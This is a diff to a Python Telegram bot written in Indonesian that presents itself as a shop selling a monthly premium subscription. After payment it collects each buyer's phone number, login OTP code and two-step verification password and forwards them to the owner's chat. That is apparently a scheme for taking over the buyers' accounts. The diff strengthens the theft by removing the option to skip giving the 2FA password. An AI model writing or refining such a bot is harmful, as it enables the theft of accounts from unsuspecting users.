@@ -12,6 +12,12 @@ load_dotenv()
 TOKEN = os.getenv("BOT_TOKEN")
 OWNER_ID = int(os.getenv("OWNER_ID"))
 
+# Setup logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+
 # Produk
 produk_list = [
     {"id": "1", "nama": "Premium 1 Bulan", "harga": 15000},
@@ -114,7 +120,6 @@ async def handle_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
             InlineKeyboardButton("✅ Konfirmasi", callback_data=f"owner_konfirmasi_{user_id}"),
             InlineKeyboardButton("❌ Tolak", callback_data=f"owner_tolak_{user_id}")
         ]]
-
         await context.bot.send_photo(chat_id=OWNER_ID, photo=file_id, caption=caption, reply_markup=InlineKeyboardMarkup(buttons))
         await update.message.reply_text("Bukti berhasil dikirim. Tunggu konfirmasi admin.")
         return INPUT_NOHP
@@ -129,8 +134,7 @@ async def handle_owner_response(update: Update, context: ContextTypes.DEFAULT_TY
     uid = int(uid)
 
     if action == "konfirmasi":
-        await context.bot.send_message(chat_id=uid, text="✅ Pembayaran dikonfirmasi. Silakan kirim nomor HP.")
-        await query.edit_message_text("Silakan tunggu... Admin sedang memproses.")
+        await context.bot.send_message(chat_id=uid, text="✅ Pembayaran dikonfirmasi.\nSilakan kirim nomor HP.")
         await context.bot.send_message(chat_id=OWNER_ID, text=f"📱 No HP dari @{update.message.from_user.username or uid} telah dikonfirmasi.")
         return INPUT_NOHP
     else:
@@ -148,10 +152,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return INPUT_OTP
     elif "otp" not in user_data_store[uid]:
         user_data_store[uid]["otp"] = text
-        buttons = [
-            [InlineKeyboardButton("❌ Skip", callback_data="skip_verifikasi")],
-        ]
-        await update.message.reply_text("✅ OTP diterima, silakan kirim verifikasi 2 langkah.", reply_markup=InlineKeyboardMarkup(buttons))
+        await update.message.reply_text("✅ OTP diterima, silakan kirim verifikasi 2 langkah.")
         await context.bot.send_message(chat_id=OWNER_ID, text=f"🔐 OTP dari @{update.message.from_user.username or uid}: {text}")
         return INPUT_VERIFIKASI
     else:
@@ -159,14 +160,6 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("✅ Data lengkap. Tunggu proses aktivasi.")
         await context.bot.send_message(chat_id=OWNER_ID, text=f"🔒 Verifikasi 2 langkah dari @{update.message.from_user.username or uid}: {text}")
         return ConversationHandler.END
-
-async def skip_verifikasi(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    await query.edit_message_text("Verifikasi 2 langkah dilewati. Proses akan dilanjutkan.")
-    await context.bot.send_message(chat_id=OWNER_ID, text=f"Verifikasi 2 langkah dilewati oleh @{query.from_user.username or user_id}.")
-    return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Dibatalkan.")
@@ -181,13 +174,19 @@ if __name__ == '__main__':
             PILIH_BULAN: [CallbackQueryHandler(button_handler)],
             KONFIRMASI: [CallbackQueryHandler(button_handler)],
             METODE_BAYAR: [CallbackQueryHandler(button_handler)],
-            KIRIM_BUKTI: [MessageHandler(filters.PHOTO, handle_media)],
+            KIRIM_BUKTI: [
+                CallbackQueryHandler(button_handler),
+                MessageHandler(filters.PHOTO, handle_media)
+            ],
             INPUT_NOHP: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)],
             INPUT_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)],
-            INPUT_VERIFIKASI: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)]
+            INPUT_VERIFIKASI: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)],
         },
         fallbacks=[CommandHandler("cancel", cancel)]
     )
 
     app.add_handler(conv_handler)
+    app.add_handler(CallbackQueryHandler(handle_owner_response, pattern="^owner_.*|^otp_.*|^verif_.*"))
+
+    print("Bot is running...")
     app.run_polling()
